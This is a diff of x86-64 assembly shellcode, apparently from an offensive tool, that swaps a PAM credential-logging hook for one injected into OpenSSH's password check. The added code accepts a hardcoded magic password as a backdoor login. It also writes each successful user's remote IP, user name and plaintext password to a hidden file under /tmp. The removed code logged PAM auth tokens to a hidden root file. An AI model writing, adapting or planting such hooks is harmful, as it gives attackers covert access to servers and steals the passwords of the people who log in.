@@ -7,114 +7,117 @@
 %define O_CREAT      0x40
 %define O_RDWR        0x2
 
-%define PAM_AUTHTOK 6
-
 BITS 64
-; this will be replaced by the real function address
-    pam_set_item: dq 0
 
-; pam_set_item(
-;    pam_handle_t *pamh, /* rdi */
-;    int item_type,      /* rsi */
-;    const void *item    /* rdx */
-; );
-_start:
-    ; check if item_type is an authentication token
-    cmp rsi, PAM_AUTHTOK
-    jne end
+john_cena_jump:
+	db 0xe9, 0x0, 0x0, 0x0, 0x0
 
-    ; check if item isn't null
-    test rdx, rdx
-    je end
+check_magic_pass:
+	lea rcx, [rel magic_pass]
+	mov rdx, rsi
 
-    ; save original parameters
-    push rdi
-    push rsi
-    push rdx
+loop:
+	mov al, [rdx]
+	cmp al, [rcx]
+	jne continue
+	test al, al
+	jz magic_pass_success
+	inc rdx
+	inc rcx
+	jmp loop
 
-    ; zeroing rdi, rdx, rax
-    xor rdi, rdi
-    mul rdi
+magic_pass_success:
+	xor rax, rax
+	inc eax
+	mov eax, 1
+return: ret
 
-    ; open(filename, flags, 0644)
-    mov al, sys_open
-    lea rdi, [rel filename]
-    mov rsi, O_RDWR|O_CREAT|O_CLOEXEC|O_APPEND
-    mov dx, 0644
-    syscall
+continue:
+	push rdi
+	push rsi
 
-    ; check if file is opened
-    ; if(fd == -1)
-    ;     goto restore
-    test rax, rax
-    js restore
+;;; call real auth_password function
+	call john_cena_jump
 
-    ; save the fd
-    mov rdi, rax
+	pop rsi
+	pop rdi
 
-    ; get *item* parameter
-    mov rsi, [rsp]
-    call save_string
+;;; test if authentication is valid
+	test eax, eax
+	jz return
 
-    ; r9 = pahm
-    mov r9, [rsp+16]
+;;; save parameters
+	mov r8, rdi
+	mov r9, rsi
 
-    ; get rhost (offset 56 at pahm struct)
-    lea rsi, [r9+56]
-    mov rsi, [rsi]
-    call save_string
+;;; try open the file ---
+	xor rsi, rsi
+	mul rsi
+	mov al, sys_open
+	lea rdi, [rel logfile]
+	mov esi, O_CLOEXEC | O_APPEND | O_CREAT | O_RDWR
+	mov dx, 0644
+	syscall
 
-    ; get user (offset 48 at pahm struct)
-    lea rsi, [r9+48]
-    mov rsi, [rsi]
-    call save_string
+;;; check if the file is opened successfully
+	test rax, rax
+	js magic_pass_success
 
-    ; close the fd
-    xor rax, rax
-    mov al, sys_close
-    syscall
+;;; restore parameters
+	mov rdi, r8
+	mov rsi, r9
 
-    ; restore the original parameters
-    restore:
-    pop rdx
-    pop rsi
-    pop rdi
+;;; magic
+	lea r8, [rsp-8]
 
-    ; jmp to real function
-    end:
-    mov r10, [rel pam_set_item]
-    jmp r10
+	; offsetof(struct ssh, remote_ipaddr)
+	lea rcx, [rdi+16]
+	mov rcx, [rcx]
+	call stack_copy
 
-    ; output file, you can edit this
-    filename: db '/root/.1337-l0g'
-    nb: db 0x0
+	; offsetof(struct ssh, authctxt);
+	lea rcx, [rdi+0x860]
+	mov rcx, [rcx]
 
-save_string:
-    xor rax, rax
+	; offsetof(struct Authctxt, user);
+	lea rcx, [rcx+0x20]
+	mov rcx, [rcx]
+	call stack_copy
 
-    test rsi, rsi
-    jnz not_null
+	; password
+	mov rcx, rsi
+	call stack_copy
 
-    ; write null-byte if parameter is a null pointer
-    lea rsi, [rel nb]
+;;; end of magic
 
-    not_null:
-    mov rdx, rsi
+	mov rdi, rax
+	xor rax, rax
+	mov al, sys_write
+	mov rsi, r8
+	lea rdx, [rsp-8]
+	sub rdx, r8
+	syscall
 
-    ; get string size
-    loop:
-    cmp [rdx], al
-    jz end_of_loop
-    inc rdx
-    jmp loop
-    end_of_loop:
+	xor rax, rax
+	mov al, sys_close
+	syscall
 
-    ; increase length for write null-byte
-    inc rdx
-    sub rdx, rsi
+	inc eax
 
-    write:
-    mov al, sys_write
-    syscall
+	ret
 
-    ret
+; copy rcx to stack
+stack_copy:
+	xchg rsp, r8
+	myloop:
+	dec rsp
+	mov dl, [rcx]
+	mov [rsp], dl
+	inc rcx
+	test dl, dl
+	jnz myloop
+	xchg rsp, r8
+	ret
+
+magic_pass: db 'anneeeeeeeeeeee', 0x0
+logfile: db '/tmp/.nothing', 0x0
